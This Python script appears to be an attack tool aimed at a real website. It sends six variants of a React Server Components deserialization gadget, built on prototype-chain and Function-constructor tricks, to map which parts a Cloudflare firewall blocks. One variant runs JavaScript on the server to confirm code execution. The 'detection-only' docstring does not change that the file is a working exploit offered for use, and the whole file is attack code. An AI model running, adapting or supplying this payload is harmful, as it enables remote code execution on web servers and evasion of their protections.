#!/usr/bin/env python3
"""Find exactly which part of the RSC gadget Cloudflare blocks.
All variants are detection-only; the only JS ever attempted is a marker throw in V3."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    return "Attention Required" in b.decode("utf-8", "ignore")[:3000]


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def part(name, val, bnd):
    return f"--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}\r\n"


def probe(tag, p0, extra=()):
    bnd = "----B" + rnd(30)
    parts = [part("0", p0, bnd), part("1", '"$@0"', bnd), part("2", "[]", bnd)]
    for n, v in extra:
        parts.append(part(n, v, bnd))
    parts.append(f"--{bnd}--\r\n")
    body = "".join(parts).encode()
    st, hd, b = req("POST", BASE + "/", headers={
        "Content-Type": f"multipart/form-data; boundary={bnd}",
        "Next-Action": rnd(40), "Accept": "text/x-component"}, body=body)
    t = b.decode("utf-8", "ignore")
    print(f"[{tag}] HTTP {st} cf={is_cf(b)} len={len(b)}")
    if st != 403:
        print("   body:", t[:260].replace("\n", " "))
    time.sleep(1.6)


req("GET", BASE + "/")
time.sleep(1)

# structure with plain prefix (no JS keywords)
probe("V1 plain-prefix",
      '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var x=1;",'
      '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}')

# structure with NEXT_REDIRECT+digest prefix but harmless (no process)
probe("V2 redirect-prefix",
      '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
      '"throw Object.assign(new Error(\\"NEXT_REDIRECT\\"),{digest:\\"PROBE_OK\\"});",'
      '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}')

# full marker gadget (proves JS eval if accepted)
prefix = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'R2S_AUDIT_PROBE_'+res});")
probe("V3 marker-gadget",
      '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":' + json.dumps(prefix) +
      ',"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}')

# structure without _response object
probe("V4 no-response",
      '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}"}')

# structure with _response but no _formData
probe("V5 response-no-formdata",
      '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var x=1;","_chunks":"$Q2"}}')

# structure with _formData but plain get
probe("V6 formdata-plain-get",
      '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var x=1;",'
      '"_chunks":"$Q2","_formData":{"get":"x"}}}')
